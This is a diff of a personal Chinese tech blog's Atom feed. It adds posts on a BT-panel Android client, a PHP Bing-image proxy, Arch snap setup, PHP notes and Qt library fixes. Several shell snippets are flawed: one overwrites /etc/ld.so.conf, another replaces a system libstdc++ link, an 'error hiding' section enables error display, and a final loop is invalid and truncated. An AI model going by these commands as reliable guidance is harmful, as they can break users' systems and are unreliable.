@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://hualin.online/"/>
-  <updated>2019-09-16T15:11:38.060Z</updated>
+  <updated>2019-09-17T12:29:25.235Z</updated>
   <id>https://hualin.online/</id>
   
   <author>
@@ -15,6 +15,127 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>BTpanel Andoid Dev</title>
+    <link href="https://hualin.online/btpanel-andoid-dev/"/>
+    <id>https://hualin.online/btpanel-andoid-dev/</id>
+    <published>2019-09-17T11:23:38.000Z</published>
+    <updated>2019-09-17T12:29:25.235Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="宝塔Linux面板Android第三方客户端"><a href="#宝塔Linux面板Android第三方客户端" class="headerlink" title="宝塔Linux面板Android第三方客户端"></a>宝塔Linux面板Android第三方客户端</h2><p>最近学习了郭霖的&lt;&lt;Android第一行代码&gt;&gt;,心里跃跃欲试想开发出一个什么东西出来,而切还不能重复造轮子,然后想到了做一个btpanel的Android客户的,这个到现在还没有官方或者第三方的成品出来,不知道等到我做出来了是猴年马月,到那时可能已经有人做出来了(笑哭).</p><h3 id="宝塔面板官方api地址"><a href="#宝塔面板官方api地址" class="headerlink" title="宝塔面板官方api地址"></a>宝塔面板官方api地址</h3><p><a href="https://www.bt.cn/bbs/thread-20376-1-1.html" target="_blank" rel="noopener">https://www.bt.cn/bbs/thread-20376-1-1.html</a><br>api官方文档 <a href="https://www.bt.cn/api-doc.pdf" target="_blank" rel="noopener">https://www.bt.cn/api-doc.pdf</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;h2 id=&quot;宝塔Linux面板Android第三方客户端&quot;&gt;&lt;a href=&quot;#宝塔Linux面板Android第三方客户端&quot; class=&quot;headerlink&quot;
+        
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Php Picture</title>
+    <link href="https://hualin.online/php-picture/"/>
+    <id>https://hualin.online/php-picture/</id>
+    <published>2019-09-17T10:15:23.000Z</published>
+    <updated>2019-09-17T11:21:11.322Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="bing-每日一图url"><a href="#bing-每日一图url" class="headerlink" title="bing 每日一图url"></a>bing 每日一图url</h2><p><a href="http://www.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1" target="_blank" rel="noopener">http://www.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1</a><br><a href="http://cn.bing.com/HPImageArchive.aspx?idx=1&amp;n=1" target="_blank" rel="noopener">http://cn.bing.com/HPImageArchive.aspx?idx=1&amp;n=1</a> 将要得到昨天的图片<br><a href="http://cn.bing.com/HPImageArchive.aspx?idx=2&amp;n=1" target="_blank" rel="noopener">http://cn.bing.com/HPImageArchive.aspx?idx=2&amp;n=1</a> 得到前天的图片<br>返回url格式<br><a href="https://cn.bing.com/th?id=OHR.StokePero_ZH-CN5293082939_1920x1080.jpg&amp;rf=LaDigue_1920x1080.jpg&amp;pid=hp" target="_blank" rel="noopener">https://cn.bing.com/th?id=OHR.StokePero_ZH-CN5293082939_1920x1080.jpg&amp;rf=LaDigue_1920x1080.jpg&amp;pid=hp</a><br>我使用以下php代码部署的api地址<br><a href="http://47.102.85.59:8000/api/bing/" target="_blank" rel="noopener">http://47.102.85.59:8000/api/bing/</a></p><pre><code>&lt;?php    function showImg($img){ //for gd &gt; 1.3      $info = getimagesize($img);      $imgExt = image_type_to_extension($info[2], false);      $fun = &quot;imagecreatefrom{$imgExt}&quot;;      $imgInfo = $fun($img);         //imagecreatefrompng ( string $filename )      //$mime = $info[&#39;mime&#39;];      $mime = image_type_to_mime_type(exif_imagetype($img)); //获取图片的 MIME 类型      header(&#39;Content-Type:&#39;.$mime);      $quality = 100;      if($imgExt == &#39;png&#39;)        $quality = 9;   //输出质量,JPEG格式(0-100),PNG格式(0-9)      $getImgInfo = &quot;image{$imgExt}&quot;;      $getImgInfo($imgInfo, null, $quality); //如: imagepng ( resource $image )      imagedestroy($imgInfo);    }    $bingurl=&quot;http://www.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1&quot;;    $response=file_get_contents($bingurl);    $response=json_decode($response,true);    $imgurl=&quot;https://cn.bing.com&quot;.$response[&quot;images&quot;][&quot;0&quot;][&quot;url&quot;];    //$prueurl=explode(&#39;&amp;&#39;,$imgurl)[&#39;0&#39;];    //copyright=$response[&quot;images&quot;][&quot;0&quot;][&quot;copyright&quot;]    showImg($imgurl);?&gt;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;h2 id=&quot;bing-每日一图url&quot;&gt;&lt;a href=&quot;#bing-每日一图url&quot; class=&quot;headerlink&quot; title=&quot;bing 每日一图url&quot;&gt;&lt;/a&gt;bing 每日一图url&lt;/h2&gt;&lt;p&gt;&lt;a
+        
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Linux Usb Ethernet Driver</title>
+    <link href="https://hualin.online/linux-usb-ethernet-driver/"/>
+    <id>https://hualin.online/linux-usb-ethernet-driver/</id>
+    <published>2019-09-17T06:54:12.000Z</published>
+    <updated>2019-09-17T12:28:42.781Z</updated>
+    
+    <content type="html"><![CDATA[<p>sudo insmod<br>sudo depmod -a<br>lspci -vvv<br>lsusb<br>lsmod<br>modinfo<br>ethtool -i eth3<br>ethtool -S eth0</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;p&gt;sudo insmod&lt;br&gt;sudo depmod -a&lt;br&gt;lspci -vvv&lt;br&gt;lsusb&lt;br&gt;lsmod&lt;br&gt;modinfo&lt;br&gt;ethtool -i eth3&lt;br&gt;ethtool -S
+        
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Arch Install Snap</title>
+    <link href="https://hualin.online/arch-install-snap/"/>
+    <id>https://hualin.online/arch-install-snap/</id>
+    <published>2019-09-17T04:45:11.000Z</published>
+    <updated>2019-09-17T04:54:42.739Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Arch-上安装snap"><a href="#Arch-上安装snap" class="headerlink" title="Arch 上安装snap"></a>Arch 上安装snap</h2><ol><li>编译安装<br>git clone <a href="https://aur.archlinux.org/snapd.git" target="_blank" rel="noopener">https://aur.archlinux.org/snapd.git</a><br>cd snapd<br>makepkg -si<br>sudo systemctl enable –now snapd.socket<br>sudo ln -s /var/lib/snapd/snap /snap<br>systemctl enable –now apparmor.service<br>systemctl enable –now snapd.apparmor.service<br>snapd安装脚本/etc/profile.d/snapd.sh</li><li>直接安装<br>sudo pacman -S snapd</li></ol><h2 id="出现Post-https-api-snapcraft-io-v2-snaps-refresh-invalid-proxy-URL-port-quot-port-quot-错误的解决方法"><a href="#出现Post-https-api-snapcraft-io-v2-snaps-refresh-invalid-proxy-URL-port-quot-port-quot-错误的解决方法" class="headerlink" title="出现Post https://api.snapcraft.io/v2/snaps/refresh:invalid proxy URL port &quot;port&quot;错误的解决方法"></a>出现<code>Post https://api.snapcraft.io/v2/snaps/refresh:invalid proxy URL port &quot;port&quot;</code>错误的解决方法</h2><p>cd /etc/systemd/system/snapd.service.d<br>cp override.conf override.conf.bak<br>sudo nano override.conf<br><code>Environment=&quot;http_proxy=http://127.0.0.1:port&quot;Environment=&quot;https_proxy=http://127.0.0.1:port&quot;</code><br>sudo systemctl daemon-reload<br>sudo systemctl restart snapd</p><h2 id="安装redis-desktop-manager"><a href="#安装redis-desktop-manager" class="headerlink" title="安装redis-desktop-manager"></a>安装redis-desktop-manager</h2><p>sudo snap install redis-desktop-manager<br>如果你无法找到redis-desktop-manager命令,那么应该是环境变量错误:<br><code>sudo nano /etc/profile在后面加入$PATH=$PATH:/var/lib/snapd/snap/bin/</code><br>也可以直接执行/var/lib/snapd/snap/bin/redis-desktop-manager.rdm</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;h2 id=&quot;Arch-上安装snap&quot;&gt;&lt;a href=&quot;#Arch-上安装snap&quot; class=&quot;headerlink&quot; title=&quot;Arch 上安装snap&quot;&gt;&lt;/a&gt;Arch 上安装snap&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;编译安装&lt;br&gt;git clone &lt;a
+        
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Learn Android</title>
+    <link href="https://hualin.online/learn-android/"/>
+    <id>https://hualin.online/learn-android/</id>
+    <published>2019-09-17T04:39:17.000Z</published>
+    <updated>2019-09-17T06:12:13.331Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Android开发常用开源库"><a href="#Android开发常用开源库" class="headerlink" title="Android开发常用开源库"></a>Android开发常用开源库</h2><p>Glide.with(fragment)<br>    .load(url)<br>    .into(imageView);</p><p>implementation ‘com.github.bumptech.glide:glide:4.9.0’</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;h2 id=&quot;Android开发常用开源库&quot;&gt;&lt;a href=&quot;#Android开发常用开源库&quot; class=&quot;headerlink&quot;
+        
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>Get Random Poems From Phpserver</title>
@@ -94,9 +215,9 @@ yum install -y wget &amp;amp;&amp;amp; wget -O install.sh http://download.bt.cn/
     <link href="https://hualin.online/learn-php/"/>
     <id>https://hualin.online/learn-php/</id>
     <published>2019-09-16T13:06:34.000Z</published>
-    <updated>2019-09-16T15:36:18.118Z</updated>
+    <updated>2019-09-17T12:29:08.605Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="for-php-gt-7-2"><a href="#for-php-gt-7-2" class="headerlink" title="for php &gt; 7.2"></a>for php &gt; 7.2</h3><pre><code>pecl install libsodiumextension=sodium.so</code></pre><h2 id="install-php"><a href="#install-php" class="headerlink" title="install php"></a>install php</h2><pre><code>pecl install libsodiumextension=sodium.so &gt;&gt; php.iniphp -a //interactive shell</code></pre><h2 id="don’t-show-error-information"><a href="#don’t-show-error-information" class="headerlink" title="don’t show error information"></a>don’t show error information</h2><pre><code>vim /etc/php.inierror_reporting = E_ALLdisplay_errors = Onerror_reporting(-1);ini_set(&#39;display_errors&#39;, 1);</code></pre><h2 id="prevent-SQL-inject"><a href="#prevent-SQL-inject" class="headerlink" title="prevent SQL inject"></a>prevent SQL inject</h2><p>just use code like below:</p><pre><code>$mysqli=new mysqli(&quot;localhost&quot;,&quot;mysql_user&quot;,&quot;mysql_pwd&quot;);if (mysqli_connect_errno()){  printf(&quot;Connect failed: %s\n&quot;, mysqli_connect_error());  exit();}$username = $_POST[&#39;user&#39;];$password = $_POST[&#39;pwd&#39;];if ($stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM Person WHERE username=? AND password=?&quot;)){  $stmt-&gt;bind_param(&quot;ss&quot;,$username,$password);  $stmt-&gt;execute();}$mysqli-&gt;close();</code></pre><h3 id="mysql-command"><a href="#mysql-command" class="headerlink" title="mysql command"></a>mysql command</h3><pre><code>&#39;;&#39;?         (\?) Synonym for `help&#39;.clear     (\c) Clear the current input statement.connect   (\r) Reconnect to the server. Optional arguments are db and host.delimiter (\d) Set statement delimiter.edit      (\e) Edit command with $EDITOR.ego       (\G) Send command to MariaDB server, display result vertically.exit      (\q) Exit mysql. Same as quit.go        (\g) Send command to MariaDB server.help      (\h) Display this help.nopager   (\n) Disable pager, print to stdout.notee     (\t) Don&#39;t write into outfile.pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.print     (\p) Print current command.prompt    (\R) Change your mysql prompt.quit      (\q) Quit mysql.rehash    (\#) Rebuild completion hash.source    (\.) Execute an SQL script file. Takes a file name as an argument.status    (\s) Get status information from the server.system    (\!) Execute a system shell command.tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.use       (\u) Use another database. Takes database name as argument.charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.warnings  (\W) Show warnings after every statement.nowarning (\w) Don&#39;t show warnings after every statement.</code></pre>]]></content>
+    <content type="html"><![CDATA[<h3 id="for-php-gt-7-2"><a href="#for-php-gt-7-2" class="headerlink" title="for php &gt; 7.2"></a>for php &gt; 7.2</h3><pre><code>pecl install libsodiumextension=sodium.so</code></pre><h2 id="install-php"><a href="#install-php" class="headerlink" title="install php"></a>install php</h2><pre><code>pecl install libsodiumextension=sodium.so &gt;&gt; php.iniphp -a //interactive shell$ sudo add-apt-repository ppa:ondrej/php$ sudo apt-get update$ sudo apt-get upgrade php$ sudo apt-get install php7.2-（*）$ sudo apt-get install php7.2-mbstring php7.2-mysqlsudo pacman -S php-apache php-cgi php-fpm php-gd  php-embed php-intl php-imap  php-redis php-snmp //basicpacman -Qi php-fpm</code></pre><h2 id="don’t-show-error-information"><a href="#don’t-show-error-information" class="headerlink" title="don’t show error information"></a>don’t show error information</h2><pre><code>vim /etc/php.inierror_reporting = E_ALLdisplay_errors = Onerror_reporting(-1);ini_set(&#39;display_errors&#39;, 1);$img = imagecreatefromjpeg(&quot;myimage.jpg&quot;);   // load the image-to-be-saved// 50 is quality; change from 0 (worst quality,smaller file) - 100 (best quality)imagejpeg($img,&quot;myimage_new.jpg&quot;,50);unlink(&quot;myimage.jpg&quot;);$url=&#39;http://www.baidu.com/&#39;;$html = file_get_contents($url);//print_r($http_response_header);ec($html);printhr();printarr($http_response_header);printhr();</code></pre><h2 id="prevent-SQL-inject"><a href="#prevent-SQL-inject" class="headerlink" title="prevent SQL inject"></a>prevent SQL inject</h2><p>just use code like below:</p><pre><code>$mysqli=new mysqli(&quot;localhost&quot;,&quot;mysql_user&quot;,&quot;mysql_pwd&quot;);if (mysqli_connect_errno()){  printf(&quot;Connect failed: %s\n&quot;, mysqli_connect_error());  exit();}$username = $_POST[&#39;user&#39;];$password = $_POST[&#39;pwd&#39;];if ($stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM Person WHERE username=? AND password=?&quot;)){  $stmt-&gt;bind_param(&quot;ss&quot;,$username,$password);  $stmt-&gt;execute();}$mysqli-&gt;close();</code></pre><h3 id="mysql-command"><a href="#mysql-command" class="headerlink" title="mysql command"></a>mysql command</h3><pre><code>&#39;;&#39;?         (\?) Synonym for `help&#39;.clear     (\c) Clear the current input statement.connect   (\r) Reconnect to the server. Optional arguments are db and host.delimiter (\d) Set statement delimiter.edit      (\e) Edit command with $EDITOR.ego       (\G) Send command to MariaDB server, display result vertically.exit      (\q) Exit mysql. Same as quit.go        (\g) Send command to MariaDB server.help      (\h) Display this help.nopager   (\n) Disable pager, print to stdout.notee     (\t) Don&#39;t write into outfile.pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.print     (\p) Print current command.prompt    (\R) Change your mysql prompt.quit      (\q) Quit mysql.rehash    (\#) Rebuild completion hash.source    (\.) Execute an SQL script file. Takes a file name as an argument.status    (\s) Get status information from the server.system    (\!) Execute a system shell command.tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.use       (\u) Use another database. Takes database name as argument.charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.warnings  (\W) Show warnings after every statement.nowarning (\w) Don&#39;t show warnings after every statement.</code></pre><h2 id="服务器php设置"><a href="#服务器php设置" class="headerlink" title="服务器php设置"></a>服务器php设置</h2><pre><code>location / {    try_files $uri $uri/ /index.php?$query_string;}#或者location / {    if (!-d $request_filename){        set $rule_0 1$rule_0;    }    if (!-f $request_filename){        set $rule_0 2$rule_0;    }    if ($rule_0 = &quot;21&quot;){        rewrite ^/(.*)$ /index.php?/$1 last;    }}</code></pre>]]></content>
     
     <summary type="html">
     
@@ -118,9 +239,9 @@ yum install -y wget &amp;amp;&amp;amp; wget -O install.sh http://download.bt.cn/
     <link href="https://hualin.online/software-on-linux/"/>
     <id>https://hualin.online/software-on-linux/</id>
     <published>2019-09-16T10:56:33.000Z</published>
-    <updated>2019-09-16T11:01:09.418Z</updated>
+    <updated>2019-09-17T05:21:29.897Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="记录一下我使用Linux遇到的有用或者无用但是美妙的软件"><a href="#记录一下我使用Linux遇到的有用或者无用但是美妙的软件" class="headerlink" title="记录一下我使用Linux遇到的有用或者无用但是美妙的软件"></a>记录一下我使用Linux遇到的有用或者无用但是美妙的软件</h3><p>sublime-text-dev-3<br>code vscode<br>vmware<br>virtualbox<br>remmina<br>octopi<br>deepin.qq.office<br>deepin-thunderspeed<br>deepin-boot-maker<br>baidupan<br>genymotion<br>netease-cloud-music<br>google-chrome<br>goldendict<br>redshift<br>wps-office<br>youdao-note<br>atom<br>gparted<br>robot3t<br>sequeler<br>sql workbench<br>studio3t<br>ratpoison<br>openbox<br>qt5 qtcreator<br>redis<br>mongodb<br>dokcer<br>tmux<br>docky<br>dbKoda<br>apt-fast<br>topgrade<br>tmux终端工具<br>stacer系统管理工具<br>oh-my-zsh终端模拟器<br>SmartGit仓库管理可视化工具<br>Docky<br>Peek<br>Inkscape<br>gimp<br>WebTorrent、FrostWire<br>dbKoda mongodb非关系数据库GUI工具<br>apt-fast<br>topgrade一个命令更新linux里面的所有软件</p><h3 id="chrome-extension"><a href="#chrome-extension" class="headerlink" title="chrome extension:"></a>chrome extension:</h3><p>infinity pro 标签页<br>Octotree github文件资源浏览树更方便地查看项目结构和页面跳转<br>Postman api test<br>SwitchyOmega<br>SimpRead - 简阅<br>Full Page Screen Capture<br>油猴tampermonkey<br>Checker Plus for Gmail</p>]]></content>
+    <content type="html"><![CDATA[<h3 id="Arch-Linux"><a href="#Arch-Linux" class="headerlink" title="Arch Linux"></a>Arch Linux</h3><p>deepin.qq.office<br>deepin-thunderspeed<br>deepin-boot-maker<br>octopi<br>code</p><h3 id="记录一下我使用Linux遇到的有用或者无用但是美妙的软件"><a href="#记录一下我使用Linux遇到的有用或者无用但是美妙的软件" class="headerlink" title="记录一下我使用Linux遇到的有用或者无用但是美妙的软件"></a>记录一下我使用Linux遇到的有用或者无用但是美妙的软件</h3><p>sublime-text-dev-3<br>vscode<br>vmware<br>virtualbox<br>remmina<br>baidupan<br>genymotion<br>netease-cloud-music<br>google-chrome<br>goldendict<br>redshift<br>wps-office<br>youdao-note<br>atom<br>gparted<br>robot3t<br>sequeler<br>sql workbench<br>studio3t<br>ratpoison<br>openbox<br>qt5 qtcreator<br>redis<br>mongodb<br>dokcer<br>tmux<br>docky<br>dbKoda<br>apt-fast<br>topgrade<br>tmux终端工具<br>stacer系统管理工具<br>oh-my-zsh终端模拟器<br>SmartGit仓库管理可视化工具<br>Docky<br>Peek<br>Inkscape<br>gimp<br>WebTorrent、FrostWire<br>dbKoda mongodb非关系数据库GUI工具<br>apt-fast<br>topgrade一个命令更新linux里面的所有软件</p><h3 id="chrome-extension"><a href="#chrome-extension" class="headerlink" title="chrome extension:"></a>chrome extension:</h3><p>infinity pro 标签页<br>Octotree github文件资源浏览树更方便地查看项目结构和页面跳转<br>Postman api test<br>SwitchyOmega<br>SimpRead - 简阅<br>Full Page Screen Capture<br>油猴tampermonkey<br>Checker Plus for Gmail</p>]]></content>
     
     <summary type="html">
     
@@ -128,7 +249,7 @@ yum install -y wget &amp;amp;&amp;amp; wget -O install.sh http://download.bt.cn/
       
         
         
-          &lt;h3 id=&quot;记录一下我使用Linux遇到的有用或者无用但是美妙的软件&quot;&gt;&lt;a href=&quot;#记录一下我使用Linux遇到的有用或者无用但是美妙的软件&quot; class=&quot;headerlink&quot;
+          &lt;h3 id=&quot;Arch-Linux&quot;&gt;&lt;a href=&quot;#Arch-Linux&quot; class=&quot;headerlink&quot; title=&quot;Arch Linux&quot;&gt;&lt;/a&gt;Arch
         
       
     
@@ -142,9 +263,9 @@ yum install -y wget &amp;amp;&amp;amp; wget -O install.sh http://download.bt.cn/
     <link href="https://hualin.online/qt5-issues/"/>
     <id>https://hualin.online/qt5-issues/</id>
     <published>2019-09-16T10:41:24.000Z</published>
-    <updated>2019-09-16T14:32:58.027Z</updated>
+    <updated>2019-09-17T06:12:13.331Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="qt6-libraries-errors"><a href="#qt6-libraries-errors" class="headerlink" title="qt6 libraries errors"></a>qt6 libraries errors</h2><pre><code>strings /usr/lib64/libstdc++.so.6 | grep GLIBCecho &#39;LD_LIBRARY_PATH=/usr/local/qt5.13.0/5.13.0/gcc_64/lib/&#39; &gt;&gt; sudo tee ~/.bashrcecho &#39;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/bin&#39; &gt;&gt; sudo tee ~/.bashrcsource ~/.bashrc</code></pre><p>or</p><pre><code>echo &#39;LD_LIBRARY_PATH=/usr/local/qt5.13.0/5.13.0/gcc_64/lib/&#39; | sudo tee /etc/profileecho &#39;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH&#39; | sudo tee /etc/profilesource /etc/profile</code></pre><p>cp /etc/skel/.profile </p><h2 id="as-for-zsh-bash"><a href="#as-for-zsh-bash" class="headerlink" title="as for zsh bash"></a>as for zsh bash</h2><pre><code>strings /usr/lib64/libstdc++.so.6 | grep GLIBCecho &#39;LD_LIBRARY_PATH=/usr/local/qt5.13.0/5.13.0/gcc_64/lib/&#39; &gt;&gt; sudo tee ~/.zshrcecho &#39;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH&#39; &gt;&gt; sudo tee ~/.zshrcsource ~/.zshrc</code></pre><p>add a custom .conf file to /etc/ld.so.conf.d, for example<br>sudo gedit /etc/ld.so.conf.d/randomLibs.conf<br>inside the file you are supposed to write the complete path to the directory that contains all the libraries that you wish to add to the system, for example:</p><pre><code>/usr/local/qt5.13.0/5.13.0/gcc_64/lib/lib/x86_64-linux-gnu</code></pre><h2 id="update-qt-gcc-lib"><a href="#update-qt-gcc-lib" class="headerlink" title="update qt gcc lib"></a>update qt gcc lib</h2><pre><code>cp /home/gcc-5.2.0/gcc-temp/stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21 /usr/lib64cd /usr/lib64rm -rf libstdc++.so.6ln -s libstdc++.so.6.0.21 libstdc++.so.6</code></pre><pre><code>sudo rm -f /usr/plugins/imageformats/libqico.sosudo ln -s /usr/local/Qt5.13.0/5.13.0/gcc_64/plugins/imageformats/libqico.so /usr/plugins/imageformats/libqico.soexport LD_PRELOAD=/usr/local/Qt5.13.0/5.13.0/gcc_64/plugins/imageformats/libqico.so</code></pre><h2 id="lib-errors"><a href="#lib-errors" class="headerlink" title="lib errors"></a>lib errors</h2><pre><code>cat /etc/ld.so.confecho &quot;/usr/local/lib&quot; | sudo tee /etc/ld.so.confsudo ldconfig</code></pre>]]></content>
+    <content type="html"><![CDATA[<h2 id="qt6-libraries-errors"><a href="#qt6-libraries-errors" class="headerlink" title="qt6 libraries errors"></a>qt6 libraries errors</h2><pre><code>strings /usr/lib64/libstdc++.so.6 | grep GLIBCecho &#39;LD_LIBRARY_PATH=/usr/local/qt5.13.0/5.13.0/gcc_64/lib/&#39; &gt;&gt; sudo tee ~/.bashrcecho &#39;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/bin&#39; &gt;&gt; sudo tee ~/.bashrcsource ~/.bashrc</code></pre><p>or</p><pre><code>echo &#39;LD_LIBRARY_PATH=/usr/local/qt5.13.0/5.13.0/gcc_64/lib/&#39; | sudo tee -a /etc/profileecho &#39;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH&#39; | sudo tee -a /etc/profilesource /etc/profile</code></pre><p>cp /etc/skel/.profile</p><h2 id="as-for-zsh-bash"><a href="#as-for-zsh-bash" class="headerlink" title="as for zsh bash"></a>as for zsh bash</h2><pre><code>strings /usr/lib64/libstdc++.so.6 | grep GLIBCecho &#39;LD_LIBRARY_PATH=/usr/local/qt5.13.0/5.13.0/gcc_64/lib/&#39; &gt;&gt; sudo tee ~/.zshrcecho &#39;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH&#39; &gt;&gt; sudo tee ~/.zshrcsource ~/.zshrc</code></pre><p>add a custom .conf file to /etc/ld.so.conf.d, for example<br>sudo gedit /etc/ld.so.conf.d/randomLibs.conf<br>inside the file you are supposed to write the complete path to the directory that contains all the libraries that you wish to add to the system, for example:</p><pre><code>/usr/local/qt5.13.0/5.13.0/gcc_64/lib/lib/x86_64-linux-gnu</code></pre><h2 id="update-qt-gcc-lib"><a href="#update-qt-gcc-lib" class="headerlink" title="update qt gcc lib"></a>update qt gcc lib</h2><pre><code>cp /home/gcc-5.2.0/gcc-temp/stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21 /usr/lib64cd /usr/lib64rm -rf libstdc++.so.6ln -s libstdc++.so.6.0.21 libstdc++.so.6</code></pre><pre><code>sudo rm -f /usr/plugins/imageformats/libqico.sosudo ln -s /usr/local/Qt5.13.0/5.13.0/gcc_64/plugins/imageformats/libqico.so /usr/plugins/imageformats/libqico.soexport LD_PRELOAD=/usr/local/Qt5.13.0/5.13.0/gcc_64/plugins/imageformats/libqico.so</code></pre><h2 id="lib-errors"><a href="#lib-errors" class="headerlink" title="lib errors"></a>lib errors</h2><pre><code>cat /etc/ld.so.confecho &quot;/usr/local/lib&quot; | sudo tee /etc/ld.so.confsudo ldconfig</code></pre><p>or</p><pre><code>$libfiles=`find /usr/local/qt5.13.0/5.13.0/gcc_64/`for libfile in $libfiles  do    filename=${$libfile}</code></pre>]]></content>
     
     <summary type="html">
     
@@ -163,8 +284,8 @@ yum install -y wget &amp;amp;&amp;amp; wget -O install.sh http://download.bt.cn/
   
   <entry>
     <title>Compress PIC Shell 批量压缩图片脚本</title>
-    <link href="https://hualin.online/compress-pic-shell-pi-liang-ya-suo-tu-pian-jiao-ben/"/>
-    <id>https://hualin.online/compress-pic-shell-pi-liang-ya-suo-tu-pian-jiao-ben/</id>
+    <link href="https://hualin.online/compress-pic-patch-shell/"/>
+    <id>https://hualin.online/compress-pic-patch-shell/</id>
     <published>2019-09-14T15:03:28.000Z</published>
     <updated>2019-09-16T11:53:57.975Z</updated>
     
@@ -275,8 +396,8 @@ yum install -y wget &amp;amp;&amp;amp; wget -O install.sh http://download.bt.cn/
   
   <entry>
     <title>Docker 配置镜像</title>
-    <link href="https://hualin.online/docker-pei-zhi-jing-xiang/"/>
-    <id>https://hualin.online/docker-pei-zhi-jing-xiang/</id>
+    <link href="https://hualin.online/docker-config/"/>
+    <id>https://hualin.online/docker-config/</id>
     <published>2019-09-14T06:38:53.000Z</published>
     <updated>2019-09-14T06:41:45.403Z</updated>
     
@@ -304,9 +425,9 @@ yum install -y wget &amp;amp;&amp;amp; wget -O install.sh http://download.bt.cn/
     <link href="https://hualin.online/some-informations/"/>
     <id>https://hualin.online/some-informations/</id>
     <published>2019-09-12T14:44:56.000Z</published>
-    <updated>2019-09-14T06:57:41.298Z</updated>
+    <updated>2019-09-17T06:12:13.361Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="百度云资料"><a href="#百度云资料" class="headerlink" title="百度云资料"></a>百度云资料</h2><p>个人整理的编程、大学资料、文学等的书籍<br>存在百度云里，可自行转存<br><a href="https://pan.baidu.com/s/1CPx9pbOlVSYdFYNxH3dTmA" target="_blank" rel="noopener">https://pan.baidu.com/s/1CPx9pbOlVSYdFYNxH3dTmA</a> 提取码: mc5d <a href="https://pan.baidu.com/s/1wAzs6cNdvPH34LnRC-8lKA" target="_blank" rel="noopener">https://pan.baidu.com/s/1wAzs6cNdvPH34LnRC-8lKA</a> 提取码: ty5e</p><h2 id="图标库"><a href="#图标库" class="headerlink" title="图标库"></a>图标库</h2><ul><li>阿里巴巴图标库 <a href="http://www.iconfont.cn" target="_blank" rel="noopener">http://www.iconfont.cn</a></li><li>icon8 <a href="https://icons8.com" target="_blank" rel="noopener">https://icons8.com</a></li><li>easyicon <a href="http://www.easyicon.net" target="_blank" rel="noopener">http://www.easyicon.net</a></li><li>iconpng <a href="http://iconpng.com" target="_blank" rel="noopener">http://iconpng.com</a></li><li>iconninja <a href="http://iconninja.com" target="_blank" rel="noopener">http://iconninja.com</a></li><li>Roundicons.com <a href="http://Roundicons.com" target="_blank" rel="noopener">http://Roundicons.com</a></li><li>undraw <a href="https://undraw.co/illustrations" target="_blank" rel="noopener">https://undraw.co/illustrations</a></li><li>instantlogosearch <a href="http://instantlogosearch.com/" target="_blank" rel="noopener">http://instantlogosearch.com/</a></li><li>logomaker <a href="https://logomakr.com/" target="_blank" rel="noopener">https://logomakr.com/</a></li><li>flaticon <a href="https://www.flaticon.com/" target="_blank" rel="noopener">https://www.flaticon.com/</a></li></ul><h2 id="搜索网站"><a href="#搜索网站" class="headerlink" title="搜索网站"></a>搜索网站</h2><ul><li><p>Bing 国际版：<a href="https://cn.bing.com/" target="_blank" rel="noopener">https://cn.bing.com/</a></p></li><li><p>DuckDuckGo：<a href="https://duckduckgo.com/" target="_blank" rel="noopener">https://duckduckgo.com/</a> 保护你的隐私</p></li><li><p>Stack Overflow：<a href="https://stackoverflow.com/" target="_blank" rel="noopener">https://stackoverflow.com/</a> 程序员的问题基本都可以在这里得到解决</p></li><li><p>Gitlogs：<a href="https://www.gitlogs.com/" target="_blank" rel="noopener">https://www.gitlogs.com/</a><br>Gitlogs 是专门针对 GitHub 项目的搜索引擎，我们通过他可以快速找到想要项目。</p></li><li><p>jiumo search 鸠摩搜书：<a href="https://www.jiumodiary.com/。" target="_blank" rel="noopener">https://www.jiumodiary.com/。</a><br>可以用来找一些技术文档手册，很多在百度网盘里。</p></li><li><p>Ebooke：<a href="https://ebookee.org/" target="_blank" rel="noopener">https://ebookee.org/</a><br>Ebookee 是一个基于互联网并提供免费电子图书下载的搜索引擎网站。</p></li><li><p>Iconfinder图标搜索：<a href="https://www.iconfinder.com/" target="_blank" rel="noopener">https://www.iconfinder.com/</a><br>用来查找 logo 